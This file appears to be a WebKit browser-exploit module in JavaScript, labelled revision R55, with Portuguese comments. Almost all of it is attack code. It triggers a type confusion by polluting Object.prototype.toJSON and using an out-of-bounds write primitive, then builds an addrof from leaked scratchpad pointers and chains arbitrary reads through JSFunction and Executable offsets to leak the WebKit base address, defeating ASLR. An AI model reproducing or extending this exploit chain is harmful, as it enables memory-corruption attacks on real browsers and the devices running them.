// js/script3/testArrayBufferVictimCrash.mjs (R55 - Análise de Estado Final na TC)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "WebKit_Exploit_R55_FinalStateAnalysis";

const VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS = 8;
const PROBE_CALL_LIMIT_V82 = 10;
const OOB_OFFSET_FOR_TC_TRIGGER = 0x7C;
const OOB_VALUE_FOR_TC_TRIGGER = 0xABABABAB;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let target_function_for_addrof;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R55() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Análise de Estado Final na TC ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init StateAnalysis...`;

    target_function_for_addrof = function someUniqueLeakFunctionR55() {};
    
    logS3(`--- Fase 0 (StateAnalysis): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    let result = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Addrof (StateAnalysis): Não obtido." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (StateAnalysis): Não iniciado." },
        tc_confirmed: false,
        final_state_analysis: null
    };

    try {
        let victim_ta_scratchpad = null;
        let m1_ref = null; 
        let m2_ref = null; 
        let tc_detected = false;

        const probe = () => {
            if (probe.calls === undefined) probe.calls = 0;
            probe.calls++;
            const ctts = Object.prototype.toString.call(this);

            if (probe.calls === 1 && this === victim_ta_scratchpad) {
                m2_ref = { id: "M2_FinalState" };
                m1_ref = { id: "M1_FinalState", m2_payload: m2_ref };
                logS3(`[PROBE_StateAnalysis] Call #1: 'this' é victim_ta_scratchpad. M1/M2 criados.`, "debug");
                return m1_ref;
            } else if (probe.calls === 2 && this === m2_ref) {
                logS3(`[PROBE_StateAnalysis] Call #2: TC CONFIRMADA! 'this' é M2 (id: ${this.id}). Tipo: ${ctts}`, "vuln");
                tc_detected = true;
                
                Object.defineProperty(this, 'analysis_prop', {
                    get: function() {
                        logS3("   [GETTER_StateAnalysis] Getter em M2 ACIONADO! Analisando estado...", "vuln_potential");
                        
                        let analysis = {
                            this_id: this.id,
                            victim_ta_content: [],
                            victim_ta_length: victim_ta_scratchpad.length
                        };

                        // Analisar o victim_ta_scratchpad
                        let u32_view = new Uint32Array(victim_ta_scratchpad.buffer);
                        for(let i=0; i < u32_view.length; i++) {
                            analysis.victim_ta_content.push(u32_view[i]);
                        }
                        result.final_state_analysis = analysis;
                        logS3(`   [GETTER_StateAnalysis] Conteúdo do victim_ta_scratchpad: [${analysis.victim_ta_content.map(v => safeToHex(v)).join(", ")}]`, "leak_detail");

                        return "analysis_done";
                    },
                    enumerable: true, configurable: true
                });
                return this;
            }
            return {};
        };
        
        victim_ta_scratchpad = new Uint32Array(VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS);
        victim_ta_scratchpad.fill(0);

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(OOB_OFFSET_FOR_TC_TRIGGER, OOB_VALUE_FOR_TC_TRIGGER, 4);

        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: probe, writable: true, configurable: true, enumerable: false });
            polluted = true;
            JSON.stringify(victim_ta_scratchpad);
        } finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

        result.tc_confirmed = tc_detected;
        if (!tc_detected) throw new Error("Falha ao acionar a Confusão de Tipos, a base do exploit está instável.");
        
        if (result.final_state_analysis) {
            let found_ptr = false;
            for(let i=0; i < result.final_state_analysis.victim_ta_content.length -1; i+=2) {
                let p = new AdvancedInt64(result.final_state_analysis.victim_ta_content[i], result.final_state_analysis.victim_ta_content[i+1]);
                if (isValidPointer(p)) {
                    found_ptr = true;
                    // Sucesso!
                    const addr_of_target_func = p; // Assumindo que o primeiro ponteiro é o que queremos
                    result.addrof_result = { success: true, msg: `addrof obtido: ponteiro encontrado no scratchpad: ${p.toString(true)}`, leaked_object_addr: p.toString(true) };
                    logS3(`   !!! ADDROF OBTIDO: ${p.toString(true)} !!!`, "success_major");

                    // Fase 2: WebKit Leak
                    logS3(`--- Fase 2 (StateAnalysis): Usando addrof para vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
                    const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                    if (!isValidPointer(ptr_exe)) throw new Error("Ponteiro para Executable inválido.");
                    const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                    if (!isValidPointer(ptr_jitvm)) throw new Error("Ponteiro para JIT/VM inválido.");
                    const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
                    logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");

                    result.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
                    document.title = `${FNAME_CURRENT_TEST_BASE} Final: WEBKIT_LEAK_OK!`;
                    break; // Sair do loop de análise de ponteiros
                }
            }
            if (!found_ptr) {
                 throw new Error("TC ocorreu, mas a análise de estado final não encontrou ponteiros no scratchpad.");
            }
        } else {
             throw new Error("TC ocorreu, mas a análise de estado final não foi executada (getter não foi acionado?).");
        }

    } catch(e) {
        logS3(`   ERRO na execução do exploit: ${e.message}`, "critical");
        result.errorOccurred = e.message;
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: FAILED`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }
    return result;
}
